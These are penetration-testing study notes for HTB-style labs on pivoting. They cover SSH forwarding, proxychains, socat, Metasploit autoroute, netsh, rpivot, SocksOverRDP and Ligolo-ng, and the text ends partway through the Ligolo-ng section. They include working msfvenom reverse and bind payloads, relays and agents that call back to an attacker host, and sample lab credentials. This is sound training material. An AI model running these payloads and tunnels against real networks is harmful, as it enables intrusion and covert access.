# Pivoting, Tunneling, and Port Forwarding

> CPTS study notes — reviewed, technically corrected, and expanded with extra hands-on detail and defensive notes.
> Scenarios follow the typical HTB Academy lab pattern: **Attack Host → Pivot Host (Ubuntu/Windows) → Internal Network**.

---

## Table of Contents

- [Introduction](#introduction)
- [Core Concepts: Pivoting vs Lateral Movement vs Tunneling](#core-concepts-pivoting-vs-lateral-movement-vs-tunneling)
- [Networking Fundamentals for Pivoting](#networking-fundamentals-for-pivoting)
  - [IP Addressing and NICs](#ip-addressing-and-nics)
  - [Public vs Private IP and NAT](#public-vs-private-ip-and-nat)
  - [Subnet Mask and Default Gateway](#subnet-mask-and-default-gateway)
  - [Routing and the Routing Table](#routing-and-the-routing-table)
  - [Protocols, Services, and Ports](#protocols-services-and-ports)
- [Hands-On: Discovering a Pivot Opportunity](#hands-on-discovering-a-pivot-opportunity)
- [SSH Local Port Forwarding](#ssh-local-port-forwarding)
- [SSH Dynamic Port Forwarding with SOCKS and Proxychains](#ssh-dynamic-port-forwarding-with-socks-and-proxychains)
- [SSH Remote (Reverse) Port Forwarding](#ssh-remote-reverse-port-forwarding)
- [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
- [Socat Redirection with a Reverse Shell](#socat-redirection-with-a-reverse-shell)
- [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)
- [SSH Pivoting on Windows with Plink](#ssh-pivoting-on-windows-with-plink)
- [SSH Pivoting with Sshuttle](#ssh-pivoting-with-sshuttle)
- [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)
- [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)
- [DNS Tunneling with Dnscat2](#dns-tunneling-with-dnscat2)
- [SOCKS5 Tunneling with Chisel](#socks5-tunneling-with-chisel)
- [ICMP Tunneling with Ptunnel-ng](#icmp-tunneling-with-ptunnel-ng)
- [RDP and SOCKS Tunneling with SocksOverRDP](#rdp-and-socks-tunneling-with-socksoverrdp)
- [Ligolo-ng: Modern All-in-One Pivoting](#ligolo-ng-modern-all-in-one-pivoting)
- [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)
- [Detection and Prevention](#detection-and-prevention)
- [Additional Resources](#additional-resources)

---

## Introduction

**Pivoting** means using a machine you've already compromised as a bridge (a "beachhead") to reach a network segment you cannot reach directly from your own attack host.

- The compromised machine you use as the bridge = **Pivot Host**
- The segment you couldn't originally see = **Internal Network**

### First things to check after landing on a host

1. **Your privilege level** — plain user? local admin? SYSTEM/root? This decides what you're even allowed to do (e.g., binding low ports, reading other users' SSH keys, installing tools).
2. **Network interfaces** — list every NIC, not just the one you connected through.

   Linux:
   ```bash
   ip a
   ip route
   ```
   Windows:
   ```cmd
   ipconfig /all
   route print
   ```

   > **Why:** the host may have one NIC on the network you can already see, and a second NIC on an internal network you can't. A host with more than one network interface is called a **dual-homed host**, and it's your classic pivot candidate.

3. **VPN / remote access software** — VPN clients, AnyDesk, RDP sessions, SSH agents, corporate tunnels (a `tun0`/`ppp0` interface, saved RDP connections, `.ovpn` profiles, etc.). Their presence usually means the host has a route into another important network.

### Port Forwarding, in one sentence

> Take a request going to a local port and make it exit somewhere else — a different port, sometimes on a different host.

Example: instead of connecting to a database server directly, you open a local port that quietly relays everything to it:
```
localhost:8080  →  InternalHost:80
```
Opening `http://127.0.0.1:8080` on your machine is then, in practice, the same as browsing directly to the internal web server.

---

## Core Concepts: Pivoting vs Lateral Movement vs Tunneling

These three terms get used interchangeably, but they answer different questions.

### 1. Lateral Movement
Moving **sideways**, to other hosts within the network segment(s) you can *already* reach. The goal is usually to:
- widen your foothold
- reach more hosts
- harvest credentials
- escalate privileges
- get closer to Domain Admin or other high-value assets

### 2. Pivoting
Using a compromised host as a relay to reach a network you **could not** reach before.

```
Attacker → cannot reach 10.10.20.0/24 directly

Compromised Host has two legs:
  192.168.1.50   (reachable from Attacker)
  10.10.20.5     (reachable from the target internal network)
```
The compromised host has "one foot" in the network you started in, and "one foot" in a new internal network.

### 3. Tunneling
Tunneling is *one way* of implementing pivoting: you wrap your traffic inside another protocol so it blends in or simply becomes routable across a single existing connection.

```
Your tool's traffic → wrapped inside an SSH channel → reaches the internal network
C2 traffic          → disguised as ordinary HTTP/HTTPS
```

Mental shortcut: **Tunneling = hiding one kind of traffic inside another kind of traffic.**

---

## Networking Fundamentals for Pivoting

Pivoting is built entirely on **IP addressing, NICs, routing, and ports** — so it's worth being solid on these before touching any tool.

Analogy: streets = the network, houses = hosts, a house's address = the host's **IP address**. A house with more than one front door = a host with more than one **NIC**.

### IP Addressing and NICs

Every host needs at least one IP address, and that address is bound to a **NIC** (Network Interface Card / network adapter). A host can have more than one NIC, and therefore more than one IP, and therefore be connected to more than one network at once.

> **Rule of thumb:** if you land on a host and it has more than one network adapter, that's a strong signal for a pivoting opportunity.

Check NICs with:

Linux/macOS:
```bash
ifconfig
# or the modern replacement:
ip a
```
Windows:
```cmd
ipconfig
```

What you're looking for on each interface:
```
Interface name
IP Address
Subnet Mask
Default Gateway
Is there more than one adapter?
Is there a VPN/tunnel interface (tun0, ppp0, etc.)?
```

**Worked example (Linux `ifconfig`)** — output shows `eth0`, `eth1`, `lo`, `tun0`:

| Interface | IP              | Meaning                                                                 |
|-----------|-----------------|--------------------------------------------------------------------------|
| `eth0`    | `134.122.100.200` | **Public IP** — reachable from the internet. Internet-facing boxes with a public IP are often sitting in a **DMZ**. |
| `eth1`    | `10.106.0.172`   | **Private IP** — lives on an internal network, not directly reachable from the internet. |
| `lo`      | `127.0.0.1`      | Loopback — the host talking to itself. Not relevant for pivoting.       |
| `tun0`    | —                | Presence of a `tun0` interface usually means a **VPN tunnel** is active on this host. |

**Worked example (Windows `ipconfig`)** — one adapter carries the actual addressing:
```
IPv4 Address:   10.129.221.36
Subnet Mask:    255.255.0.0
Default Gateway: 10.129.0.1
```

> **Note:** these notes focus on IPv4 because it's still what you'll meet in the overwhelming majority of enterprise LANs and HTB labs, even though IPv6 does show up occasionally and shouldn't be ignored on a real engagement.

### Public vs Private IP and NAT

- **Public IP** — routable on the internet.
- **Private IP** — only routable inside a local network (RFC 1918 ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

For a private IP to reach the internet, it's normally translated to a public IP via **NAT** (Network Address Translation) at the network's edge (router/firewall).

### Subnet Mask and Default Gateway

If the IP is the house's street address, the **subnet mask** is basically the neighborhood/zone code — it tells you which other addresses are "local" to this host.

The **Default Gateway** is the door the host walks through whenever it wants to talk to an IP that is *not* in its own subnet. If the destination isn't local, traffic gets sent to the default gateway.

### Routing and the Routing Table

A router doesn't have to be a dedicated router appliance — **any computer can route traffic** if it's configured (or convinced) to do so. In several pivoting scenarios you'll explicitly turn a pivot host into that kind of relay.

> There's also a Metasploit post-exploitation module called **`post/multi/manage/autoroute`** that adds routes to Metasploit's own internal routing table through an existing Meterpreter session, so that other MSF modules — and sockets created through that session — can transparently reach the newly discovered subnet. (Don't confuse this with the unrelated `autoroute` *command* used later inside Ligolo-ng — same word, two completely different tools.)

The **routing table** is the host's small internal map: whenever it needs to send a packet, it consults this table to decide which interface to send it out of and which gateway to hand it to.

Check it with:
```bash
netstat -r      # Linux/macOS
ip route        # Linux
route print     # Windows
```

Key columns to read:

| Column      | Meaning                                   |
|-------------|--------------------------------------------|
| Destination | The target network                        |
| Gateway     | Who to hand the packet to so it gets there |
| Genmask     | The subnet mask for that destination      |
| Iface       | Which interface it goes out of            |

When hunting for a pivot opportunity, check the routing table to see what networks the host can already reach, or what route you might need to add.

### Protocols, Services, and Ports

**Protocols** are the agreed-upon rules of communication on a network, and most protocols/services live on well-known ports (SSH → 22, HTTP → 80, MySQL → 3306, RDP → 3389, and so on). Recognizing a service by its port number is what tells you *what* you're actually pivoting toward.

---

## Hands-On: Discovering a Pivot Opportunity

A compact walkthrough that ties the concepts above together.

**Given:**
```
Pivot Host name : ubuntu
Pivot Host IP   : 10.129.31.80
Password        : Pass123
```

**1) Get in over SSH:**
```bash
ssh ubuntu@10.129.31.80
```

**2) From your attack host, scan what's externally visible:**
```bash
nmap -p- -A -sV 10.129.31.80
```
Result — only two ports are open from the outside:
```
22/tcp  open  ssh
80/tcp  open  http
```

**3) From inside the SSH session, enumerate the host's interfaces** — there may be internal ports or an entire internal network you can't see yet:
```bash
ifconfig
```
Result:
```
ens192 : inet 10.129.31.80    ← this one you can already reach (it's "public" relative to you)
ens224 : inet 172.16.5.129    ← this one you can't reach directly — it's the internal network
```

**4) Still inside the SSH session, check for internally-open ports:**
```bash
netstat -antp
```
Result includes, among others:
```
127.0.0.1:3306   LISTEN
```
MySQL is running, but only bound to the loopback interface — so it's invisible from outside the box, even though you're now standing right next to it.

**5) Forward that hidden port to your own machine** — this is exactly what [SSH Local Port Forwarding](#ssh-local-port-forwarding) is for:
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.31.80
```

**6) Confirm it worked, from your attack host:**
```bash
nmap localhost -p 1234
nmap localhost -p 1234 -A     # identify the service banner
```

> **Tip:** when you scan `localhost` with plain `nmap localhost` (no `-p`), Nmap only scans its default **top-1000** ports. Custom high ports you pick yourself (like `1234`) are not guaranteed to be in that list, so always pin the port explicitly with `-p` when checking a forward you just created.

---

## SSH Local Port Forwarding

Use this when you already know exactly which internal service you want to reach.

**Scenario:**
```
Attack Host        : 10.10.15.5
Victim Ubuntu Host : 10.129.202.64
```

Scan the target:
```bash
nmap -sT -p22,3306 10.129.202.64
```
Result:
```
22/tcp   open   ssh
3306/tcp closed mysql
```
SSH is open, MySQL is closed from the outside — but it's probably alive and bound to `localhost:3306` on the box itself.

**Solution — Local Port Forward:**
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

Breaking the command down:

| Piece                | Meaning |
|----------------------|---------|
| `ssh`                | Connect to the server over SSH |
| `-L`                 | Local Port Forwarding |
| `1234`               | The port that opens **on your machine** |
| `localhost:3306`     | The destination, from the **SSH server's** point of view (MySQL, local to the Ubuntu box) |
| `ubuntu@10.129.202.64` | The user and host you're SSHing into |

Result:
```
Your machine:127.0.0.1:1234
        ↓  (tunneled through SSH)
Ubuntu server:localhost:3306
```
Talking to `localhost:1234` on your machine is now, in effect, talking to MySQL on the remote server.

### Verifying the forward worked

**Via `netstat`:**
```bash
netstat -antp | grep 1234
```
Look for:
```
127.0.0.1:1234   LISTEN
```
> Run this with `sudo` if you need to also see which process owns the socket.

**Via `nmap`:**
```bash
nmap -v -sV -p1234 localhost
```
Result:
```
1234/tcp open  mysql  MySQL 8.0.28
```

### Forwarding multiple ports at once

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
```
localhost:1234 → Ubuntu localhost:3306   (MySQL)
localhost:8080 → Ubuntu localhost:80     (Web server)
```

---

## SSH Dynamic Port Forwarding with SOCKS and Proxychains

Local forwarding is great when you know exactly which single port you want. But what if you don't know which ports are open on the internal network yet, and you want your tools (Nmap, curl, a browser, …) to be able to reach the whole segment through the pivot host?

That's what these three work together to solve:
```
Dynamic Port Forwarding
SOCKS Proxy
Proxychains
```

Concept: the **proxy** is the middleman sitting between you and the internal network (via the pivot host). SSH's dynamic forwarding turns your SSH connection itself into a **SOCKS proxy**, and **Proxychains** forces other Linux tools to route their traffic through that SOCKS proxy instead of connecting directly.

### Static vs Dynamic

Local forwarding is "static" — one fixed local port maps to one fixed remote destination:
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.31.80
```

Dynamic forwarding instead opens a general-purpose SOCKS listener that can relay to **any** destination the pivot host can reach:
```bash
ssh -D 9050 ubuntu@10.129.31.80
```
- `-D` → dynamic forwarding
- `9050` → the local SOCKS port your tools will connect to (SSH's dynamic forward speaks both SOCKS4 and SOCKS5)

### Proxychains configuration

Kali's current package is `proxychains4`, and its config file is normally:
```bash
sudo vim /etc/proxychains4.conf
```
> Older systems, or older Proxychains versions, may instead use `/etc/proxychains.conf`. If you're not sure which one your install reads, check with `dpkg -L proxychains4 | grep conf`, and if the `proxychains` command doesn't exist, use `proxychains4` explicitly — the binary was renamed upstream.

Scroll to the `[ProxyList]` section at the bottom and make sure this line is present (uncommented):
```
socks4  127.0.0.1  9050
```
Confirm:
```bash
tail -4 /etc/proxychains4.conf
```
> **Extra tip:** SOCKS4 doesn't support DNS resolution through the proxy. If a tool needs to resolve internal hostnames (not just IPs), switch the entry to `socks5 127.0.0.1 9050` and enable `proxy_dns` in the config — otherwise DNS lookups will still leak out through your own resolver instead of through the tunnel.

### Using it

Once dynamic forwarding is up and Proxychains is configured, prefix any tool with `proxychains` (or `proxychains4`) to route it through the pivot:

```bash
proxychains nmap -v -Pn -sT 172.16.5.19
```
> `-sT` (full TCP connect scan) is important here — SYN scans (`-sS`) need raw sockets, which don't work through a SOCKS proxy.

Host discovery across a subnet:
```bash
proxychains nmap -sn 172.16.5.0/24
```

Connectivity check:
```bash
proxychains ping 172.16.5.19
```

### Full order of operations

1. Edit the Proxychains config and add `socks4 127.0.0.1 9050` (or `socks5` — see tip above), verify with `tail -4 /etc/proxychains4.conf`.
2. Bring up the dynamic SSH tunnel: `ssh -D 9050 ubuntu@10.129.31.80`.
3. From a **separate** terminal, run tools prefixed with `proxychains`, e.g. `proxychains nmap -sn 172.16.5.0/24`.
4. Verify connectivity with `proxychains ping <HOST_IP>`.
5. Enumerate further with `proxychains nmap -v -Pn -sT <HOST_IP>`.

---

## SSH Remote (Reverse) Port Forwarding

The opposite direction from `-L`: instead of you opening a port to reach a remote service, you make the **remote** (pivot) server open a port, and any connection that lands on it gets relayed back to **your** machine.

```
ssh -R
```

**Scenario:**
```
Attack Host
    | can reach
    v
Ubuntu Pivot Host
    | can reach
    v
Windows Target
```
Windows cannot reach the Attack Host directly (it lives in `172.16.5.0/23`, with no route to your `10.129.x.x` network), so a normal reverse-shell payload calling straight back to your IP would simply fail to connect.

**Solution:** make Windows call back to Ubuntu, and have Ubuntu relay that connection to you.

> **Also worth remembering:** even when you already have RDP access to the internal Windows box, RDP alone often isn't enough — clipboard sharing may be disabled (blocking file transfer), you may want a full Meterpreter session for deeper enumeration, or you may need capabilities that plain RDP / built-in Windows tools simply don't offer.

### Step-by-step

**1) Build the payload for the Windows target:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<INTERNAL_NETWORK_IP> LPORT=<ANY_PORT> -f exe -o <FILE_NAME.exe>
```
- `-f` → output format
- `-o` → output filename
- `LPORT` → any free port you choose
- `LHOST` → the pivot host's **internal-facing** IP (the interface facing the target network), **not** your own attack box IP and **not** the IP you SSH into

**2) Start a Metasploit listener on your attack box:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 4444
run
```

**3) Copy the payload to the Ubuntu pivot host:**
```bash
scp test.exe ubuntu@10.129.146.56:~/
```
Verify with `ls` over the existing SSH session.

**4) Serve it from the pivot host over HTTP:**
```bash
python3 -m http.server 8123
```

**5) Pull it down onto Windows** (assuming you have RDP or a shell there already):
```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/test.exe" -OutFile "C:\test.exe"
```

**6) Set up the reverse port forward** (run this from your attack host — it stacks on top of the SSH session you already have to Ubuntu):
```bash
ssh -R <UBUNTU_INTERNAL_IP>:<ANY_PORT>:0.0.0.0:4444 ubuntu@10.129.146.56
```
- `-R` → Remote/Reverse Port Forwarding
- `<UBUNTU_INTERNAL_IP>:<ANY_PORT>` → address/port that Ubuntu will listen on (must match the `LHOST`/`LPORT` you baked into the payload)
- `0.0.0.0:4444` → forwarded on to your Metasploit handler's port

> **Why `0.0.0.0` here?** On Linux, connecting to `0.0.0.0` as a destination is treated as connecting to `127.0.0.1` — a well-known kernel quirk that this trick relies on. If that ever behaves oddly on a different OS/build, use `127.0.0.1:4444` explicitly instead; it means the same thing here.
>
> **Common gotcha:** by default, `sshd`'s `GatewayPorts` setting is `no`, which forces remote-forwarded listeners to bind only to `127.0.0.1` on the server — even if you asked for a specific non-loopback bind address. If Windows can't reach the port Ubuntu is supposed to be listening on, check `/etc/ssh/sshd_config` on the pivot for `GatewayPorts yes` (or `clientspecified`), which is required to bind to an address other than loopback.

**7) Run the payload on Windows.** Your Metasploit handler should pop a session — note that the connection will *appear* to originate from Ubuntu, not directly from Windows, since Ubuntu is the one relaying it:
```
Meterpreter session 1 opened
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## Meterpreter Tunneling and Port Forwarding

Everything above can also be done through an existing **Meterpreter** session on the pivot host, without manually juggling SSH flags. It's still recommended to understand and practice the manual SSH way first — Meterpreter just wraps the same ideas.

### Discovering hosts on the internal network from inside a session

Linux target, shell access:
```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

Windows target, `cmd.exe`:
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Windows target, PowerShell:
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### Routing traffic through the session (`autoroute`)

Once you have a Meterpreter session on the pivot host:
```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <id>
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
(the older, equivalent one-liner from inside the session itself is `run autoroute -s 172.16.5.0/24`). This makes the subnet reachable by other Metasploit modules and by Meterpreter's own pivoted sockets.

### Turning the session into a SOCKS proxy

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run
```
Then use it exactly like the SSH dynamic-forward SOCKS proxy — point Proxychains at `127.0.0.1:9050` and prefix your tools with `proxychains`.

### Forwarding a single port through the session

```
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.25
```
This behaves like `ssh -L`: local port `3389` on your attack box now reaches `172.16.5.25:3389` through the Meterpreter session.

---

## Socat Redirection with a Reverse Shell

Same underlying idea as SSH reverse forwarding, using `socat` on the pivot host instead.

`socat` just relays traffic from one place to another — "anyone who talks to me on port 8080, I'll forward everything they say to the attacker on port 80."

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- `TCP4-LISTEN:8080` → open a listener on port 8080 on Ubuntu
- `fork` → keep accepting new connections instead of dying after the first one
- `TCP4:10.10.14.18:80` → relay everything to the attacker's IP and port

### Building the payload (Ubuntu ↔ Internal Host relay)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```
- `LHOST` → the pivot host's internal-facing IP
- `LPORT` → the port the internal host will call back to, on the pivot

### Metasploit handler (attacker side)

```
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

Result:
```
Meterpreter session 1 opened
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```
Keep in mind: your session will appear to come from the Ubuntu pivot's IP, not from the Windows box directly, because Ubuntu is doing the forwarding.

---

## Socat Redirection with a Bind Shell

Reverse shell direction:
```
Windows → Ubuntu → Attacker
```
Bind shell direction (Windows opens a port and waits; you connect to it):
```
Attacker → Ubuntu → Windows
```
```
Attacker connects to Ubuntu:8080
Ubuntu relays the connection to Windows:8443
Windows hands back a Bind Shell
```

### Payload for Windows

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```
When run, this makes Windows listen on `8443` and wait for a connection.

### Socat on Ubuntu

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
- Ubuntu listens on `8080`
- `fork` handles multiple connections
- Traffic gets relayed to the internal Windows host on `8443`

### Metasploit handler (attacker side)

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```
- `RHOST` → Ubuntu's IP (the box you can actually reach)
- `LPORT` → Ubuntu's socat listener port

### Result

```
Meterpreter session 1 opened
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## SSH Pivoting on Windows with Plink

Rare in practice — this is for when *you* are working from a Windows attack box (instead of Linux) and still need SSH-based pivoting. `plink.exe` (part of the PuTTY suite) can replicate SSH dynamic forwarding on Windows:

```cmd
plink.exe -D 9050 -P 22 -l ubuntu -pw Pass123 10.129.202.64
```
This opens a SOCKS proxy on `127.0.0.1:9050`, exactly like `ssh -D` does on Linux — you'd then point a Windows-compatible proxifier (e.g., Proxifier) at it instead of Proxychains. Low priority to dig into deeply; good to recognize if you ever see `plink.exe` running on a box.

---

## SSH Pivoting with Sshuttle

`sshuttle` behaves like a lightweight **VPN built on top of SSH**. Instead of prefixing every single command with `proxychains`:
```bash
proxychains nmap ...
proxychains xfreerdp ...
proxychains curl ...
```
you start `sshuttle` **once**, and after that your machine can reach the internal network directly — no per-command wrapper needed:
```bash
nmap 172.16.5.19
xfreerdp /v:172.16.5.19
```

Install:
```bash
sudo apt-get install sshuttle
```

**Scenario:**
```
Attack Host  --SSH-->  Ubuntu Pivot Host  --sees-->  172.16.5.0/23 (internal), including Windows host 172.16.5.19 with RDP on 3389
```

### Usage

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
- `-r` → remote host to connect through (`user@host`)
- `172.16.5.0/23` → the internal subnet(s) to route through the tunnel
- `-v` → verbose

### Verifying access

In a second terminal, with `sshuttle` still running in the first:
```bash
sudo nmap -v -A -sT 172.16.5.19 -Pn
```
> `-sT` matters here too, for the same reason as with Proxychains — raw-socket scan types don't traverse the tunnel.

### Sshuttle vs Proxychains

| Proxychains                                   | Sshuttle                                      |
|------------------------------------------------|------------------------------------------------|
| Needs a SOCKS proxy running (e.g. `ssh -D`) | Sets itself up over a plain SSH connection    |
| Must prefix **every** command                | Run once, then use tools normally             |
| Fine-grained per-tool control                 | Easier and less error-prone for broad access  |

### Good extras to know

- `sshuttle` pushes and runs a small Python script on the remote pivot host over SSH, so **Python must be present there** — usually not an issue on Linux pivots, but worth checking.
- `-x <subnet>` excludes a subnet from the tunnel.
- `--dns` also transparently tunnels your DNS queries through the pivot, which is handy for resolving internal-only hostnames.

### Limitations

1. Requires SSH access to the pivot host.
2. Only works over SSH (no other transport).
3. It's a convenience layer, not a full VPN replacement — no UDP support, for example.

---

## Web Server Pivoting with Rpivot

Clone:
```bash
git clone https://github.com/klsecservices/rpivot.git
```

`rpivot` builds a **Reverse SOCKS Proxy**: instead of you initiating a connection into the internal network, the compromised Ubuntu pivot calls back out to you, and you then use that connection as your gateway inward.

> **Note:** `rpivot` is old and unmaintained, and requires **Python 2**, which most modern distros (including recent Kali) no longer ship by default. Install it separately (`sudo apt install python2`) or use a Python 2 virtual environment before running the tool.

**Scenario:**
```
Attack Host (172.16.5.129) → Ubuntu Pivot → Internal Web Server (172.16.5.135:80)
```

### 1) On your attack host, start the server component

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
- `9050` → the port Proxychains will use locally
- `9999` → the port the victim/pivot connects back to
- `0.0.0.0` → listen on all interfaces

### 2) Transfer the tool to the pivot host

```bash
scp -r rpivot ubuntu@<target-ip>:/home/ubuntu/
```

### 3) On the pivot host, run the client

```bash
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999
```
This tells Ubuntu to call back to your machine. On success you'll see something like `New connection from host ...` — the tunnel is up.

### 4) Configure Proxychains and use it

```
socks4  127.0.0.1  9050
```
```bash
proxychains firefox
```
Browse to the internal target's address, and you'll be routed through the pivot straight to it.

---

## Port Forwarding with Windows Netsh

For when the **pivot host itself is Windows**, not Linux. Windows' built-in `netsh` can act as a simple port-forwarding relay.

**Scenario:**
```
Attack Host (10.10.15.5) → Windows Pivot (10.129.15.150 / 172.16.5.19) → Internal Windows Server (172.16.5.25:3389)
```

### Set up the forward

On the compromised Windows pivot:
```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
Meaning: "listen on `10.129.15.150:8080`, and forward anything that lands there to `172.16.5.25:3389`."

> **Don't forget the firewall.** `portproxy` rules do not automatically punch a hole in Windows Firewall. You typically also need:
> ```cmd
> netsh advfirewall firewall add rule name="pivot-8080" dir=in action=allow protocol=TCP localport=8080
> ```

### Confirm it's active

```cmd
netsh.exe interface portproxy show v4tov4
```
Expected output:
```
10.129.15.150   8080   172.16.5.25   3389
```

### Connect from your attack host

```bash
xfreerdp /v:10.129.15.150:8080 /u:victor /p:'pass@123'
```
You're connecting to the Windows pivot on port `8080`, but you're really landing an RDP session on the internal `172.16.5.25:3389`.

---

## DNS Tunneling with Dnscat2

*(Kept brief — most engagements reach for a simpler modern tool for this scenario, see [Ligolo-ng](#ligolo-ng-modern-all-in-one-pivoting).)*

`dnscat2` encapsulates a C2 channel inside DNS queries/responses. It matters specifically in environments with very restrictive egress filtering where **only DNS resolution** is allowed out, since DNS traffic is rarely blocked outright. Trade-off: it's slow, and unusually high-volume or high-entropy DNS traffic to one domain is a well-known detection signature (see [Detection and Prevention](#detection-and-prevention)).

---

## SOCKS5 Tunneling with Chisel

*(Kept brief — same reasoning as above.)*

`chisel` is a single, self-contained Go binary that builds a fast tunnel (including a SOCKS5 proxy) over plain HTTP/HTTPS, using a client/server model. It's especially useful when the only allowed egress from the target network is HTTP/HTTPS — including through corporate web proxies that would otherwise block a raw SSH connection outward.

---

## ICMP Tunneling with Ptunnel-ng

*(Kept brief, but the concept is worth knowing.)*

`ptunnel-ng` is the tool for a very specific edge case: a firewall that allows **ICMP echo (ping) only**, and blocks essentially everything else outbound. It tunnels TCP traffic inside ICMP echo request/reply packets. It needs raw-socket privileges (root/admin) on both ends and is slow, but can be the only way out of a heavily locked-down segment.

---

## RDP and SOCKS Tunneling with SocksOverRDP

Relevant specifically when:
```
- you're already inside a Windows box via an RDP session
- there's no SSH available
- you can't run a Ligolo agent or open a normal outbound connection
- but you want to tunnel arbitrary traffic through that same RDP channel
```

`SocksOverRDP` works by piggybacking on RDP's **Dynamic Virtual Channels (DVC)** — the same underlying mechanism RDP already uses for things like clipboard sync and audio redirection — to carry arbitrary SOCKS traffic instead, without opening a new socket, connection, or firewall port.

### Workflow

1. **On your attack machine**, register the client-side plugin so `mstsc.exe` loads it automatically:
   ```cmd
   regsvr32.exe SocksOverRDP-Plugin.dll
   ```
2. **Transfer `SocksOverRDP-Server.exe`** to the target you'll RDP into, and run it there (needs admin rights).
3. **Connect with `mstsc.exe`** to that target as normal. You should get a prompt confirming the SocksOverRDP plugin is active, and it will start listening locally on **`127.0.0.1:1080`** on your attack machine.
4. **Point a proxy-aware tool at `127.0.0.1:1080`.** A common pairing is **Proxifier**, which can force arbitrary Windows GUI applications (not just SOCKS-aware ones) to route through that local SOCKS listener — handy for double-pivot scenarios where you need full Windows tools (not just CLI utilities) reaching a second internal network behind the RDP target.

---

## Ligolo-ng: Modern All-in-One Pivoting

`ligolo-ng` bundles together most of what the sections above do manually — routing, SOCKS-like tunneling, port forwarding, multi-hop pivoting — behind one clean interface, which is why it's usually the fastest tool to reach for once you understand the fundamentals above.

### Download

Releases: `https://github.com/nicocha30/ligolo-ng/releases`

You run the **proxy** component on your own attacker machine, and drop an **agent** binary on the victim/pivot.

| Your OS       | Victim OS | Download for you            | Download for the victim      |
|---------------|-----------|------------------------------|-------------------------------|
| Windows       | Linux     | `proxy_windows_amd64.zip`    | `agent_linux_amd64.tar.gz`    |
| Linux / Kali  | Windows   | `proxy_linux_amd64.tar.gz`   | `agent_windows_amd64.zip`     |
| Windows       | Windows   | `proxy_windows_amd64.zip`    | `agent_windows_amd64.zip`     |
| Linux / Kali  | Linux     | `proxy_linux_amd64.tar.gz`   | `agent_linux_amd64.tar.gz`    |

> **Architecture:** almost always `amd64` in labs/HTB. `amd64` just means "64-bit," regardless of whether the CPU is Intel or AMD — it is not AMD-specific.

### Example scenario

```
Pivot Host : 10.129.23.228  (Windows)
User       : htb-student
Password   : HTB_@cademy_stdnt!
```
```bash
xfreerdp3 /v:10.129.23.228 /u:htb-student /p:HTB_@cademy_stdnt!
```

### 1) Start the proxy on the attacker side

```bash
sudo ./proxy -selfcert
```
`-selfcert` generates and accepts a throw-away self-signed TLS certificate — fine for a lab, not for a real engagement, where you'd prefer `-autocert` (Let's Encrypt) or your own cert via `-certfile`/`-keyfile`.

### 2) Deliver the agent to the victim

Serve it:
```bash
python3 -m http.server
```
From the victim's RDP session, in PowerShell:
```powershell
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:<PYTHON_SERVER_PORT>/agent.exe" -OutFile agent.exe
```

### 3) Run the agent and establish the tunnel

```powershell
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```
- `11601` → Ligolo-ng's default proxy port
- `-ignore-cert` → skip validation of the self-signed cert from step 1

Back in the Ligolo-ng proxy console you'll see the agent join. List and select the session:
```
session
```
Press Enter on the listed session to attach to it.

### 4) Route traffic to the internal network

Attaching to a session gets you a tunnel to that one host — it doesn't yet know how to reach networks *behind* it. Ligolo-ng's `autoroute` handles this in one step (current versions create the routes and the TUN interface automatically):
```
autoroute
```
- Pick the subnet(s) to route
- Choose "create a new interface" (or reuse an existing one)
- Confirm "start the tunnel? y"

> Run any actual enumeration commands (`nmap`, `ping`, `xfreerdp`, …) against the internal IPs from your **normal terminal**, not from inside the Ligolo-ng console — the console is just for managing sessions/routes.

### Port forwarding / chaining a second pivot

To relay a listener through the tunnel (e.g., to catch a second agent connecting in from deeper in the network):
```
